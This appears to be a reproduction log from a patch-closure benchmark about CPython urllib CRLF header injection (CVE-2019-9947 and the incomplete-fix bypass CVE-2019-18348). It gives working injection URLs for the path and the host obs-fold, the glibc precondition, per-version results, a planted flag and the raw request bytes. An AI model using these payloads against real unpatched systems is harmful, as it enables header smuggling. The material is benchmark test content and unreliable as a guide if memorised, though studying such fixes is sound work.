PatchClosure-Bench repro — cpython-urllib-crlf-header-injection-cve-2019-18348
Pair: CVE-2019-9947 (original, URL PATH) -> CVE-2019-18348 (incomplete-fix target, URL HOST)
Sink: CPython Lib/http/client.py — _contains_disallowed_url_pchar_re control-char check in putrequest
Oracle: Variant A (same sink / same flag channel). Run 2026-07-13 on real Docker (Docker 29.4.0).
Command: python3 oracle.py --run-gate

============================ VERSION PINNING (verified from source) ============================
Read Lib/http/client.py at v3.7.2 / v3.7.4 / v3.7.5 / v3.7.6 / v3.7.7 / v3.7.8 (raw.githubusercontent.com):
  v3.7.2  : NO _contains_disallowed_url_pchar_re. putrequest builds 'GET <url> HTTP/1.1' with no
            control-char check on the path; host only ASCII/IDNA-encoded.            [V0]
  v3.7.4  : ADDS _contains_disallowed_url_pchar_re = re.compile('[\x00-\x20\x7f]') and applies it to
            the URL PATH in putrequest ("# Prevent CVE-2019-9740."). HOST is still NOT scanned.  [V1 TARGET]
  v3.7.5/6/7 : still NO host check (no _validate_host).  -> confirms V1 residual open across the whole line.
  v3.7.8  : ADDS _validate_host (same regex, "# Prevent CVE-2019-18348."), called from __init__ as
            self._validate_host(self.host). First 3.7.x with the host check.          [V2]
CVE-2019-18348 fixed versions (advisory): 2.7.18, 3.5.10, 3.6.11, 3.7.8, 3.8.3 -> first 3.7.x = 3.7.8. OK.
Distinct fixed versions (3.7.4 vs 3.7.8) and distinct fixes/commits (CVE-2019-9947 path vs
CVE-2019-18348 bpo-38576/PR#18995 host). OK.

============================ GLIBC PRECONDITION (empirically confirmed) ============================
Advisory / RH bugzilla #1727276: host-CRLF exploitable only when glibc CVE-2016-10739 is UNPATCHED,
"as it requires getaddrinfo() function to resolve an invalid hostname".
  python:3.7.4-slim        (Debian buster, patched glibc 2.28): socket.getaddrinfo("127.0.0.1\r\n\tX", 8099)
        -> gaierror [Errno -2] Name or service not known  => connect fails, NOT observable (documented).
  python:3.7.4-slim-stretch(Debian stretch, glibc 2.24, pre-fix): getaddrinfo("127.0.0.1\r\n\tX",8099)
        -> ('127.0.0.1', 8099)  => leniently resolves, connect reaches the sidecar. Case uses -stretch.

============================ GATE (validate_case, Variant A) ============================
flag = PCBFLAG_e87966901b08e735fab1ae2176246760   (per-run random; planted in sidecar via env)

original_poc = CVE-2019-9947 PATH-CRLF:
  url = 'http://10.89.0.2:80/x HTTP/1.1\r\nX-PCB-Auth: PCB-AUTH-7f3a\r\nZ:'
residual_poc = CVE-2019-18348 HOST-CRLF/obs-fold:
  url = 'http://10.89.0.2\r\n\tX-PCB-Auth: PCB-AUTH-7f3a\r\n\t:80/'   (tab obs-fold; space variant also works)

  [V0 3.7.2] original -> RESULT HTTP 200 || PCBFLAG_e87966901b08e735fab1ae2176246760   FLAG REACHED
  [V1 3.7.4] original -> RESULT InvalidURL: URL can't contain control characters.
                         '/x HTTP/1.1\r\nX-PCB-Auth: PCB-AUTH-7f3a\r\nZ:' (found at least ' ')   BLOCKED (_validate_path)
  [V1 3.7.4] residual -> RESULT HTTP 200 || PCBFLAG_e87966901b08e735fab1ae2176246760   FLAG REACHED (bypass!)
  [V2 3.7.8] residual -> RESULT InvalidURL: URL can't contain control characters.
                         '10.89.0.2\r\n X-PCB-Auth: PCB-AUTH-7f3a\r\n ' (found at least '\r')   BLOCKED (_validate_host)
  [V2 3.7.8] original -> RESULT InvalidURL: ... BLOCKED

Sidecar wire observation (raw bytes it received on V1 residual, from earlier host-network probe):
  GET / HTTP/1.1\r\nAccept-Encoding: identity\r\nHost: 10.89.0.2\r\n\tX-PCB-Auth: PCB-AUTH-7f3a\r\n\t:80\r\n
  User-Agent: Python-urllib/3.7\r\nConnection: close\r\n\r\n
  -> the injected 'X-PCB-Auth: PCB-AUTH-7f3a' rides in as an obs-fold continuation of the Host header;
     the raw sidecar unfolds it and returns ${PCB_FLAG}.

